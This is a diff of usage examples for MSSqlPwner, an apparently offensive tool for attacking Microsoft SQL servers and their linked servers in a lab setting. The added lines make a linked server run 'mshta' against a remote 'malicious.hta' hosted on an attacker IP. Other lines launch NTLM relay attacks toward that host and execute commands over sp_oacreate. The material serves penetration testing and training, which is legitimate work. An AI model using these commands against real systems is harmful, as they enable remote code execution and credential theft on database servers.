@@ -90,16 +90,16 @@ python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server 
 python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server SRV01 exec hostname
 
 # Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method
-python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server SRV01 exec "cmd /c dir \\\\192.168.45.250\\test" -command-execution-method sp_oacreate
+python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate
 
 # Issuing NTLM relay attack on the SRV01 server
-python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server SRV01 ntlm-relay \\\\192.168.45.250\\test
+python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server SRV01 ntlm-relay 192.168.45.250
 
 # Issuing NTLM relay attack on chain ID 5
-python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 5 ntlm-relay \\\\192.168.45.250\\test
+python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 5 ntlm-relay 192.168.45.250
 
 # Issuing NTLM relay attack on the local server with custom command
-python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay \\\\192.168.45.250\\test
+python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
 
 # Executing direct query
 python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth direct_query "SELECT CURRENT_USER"
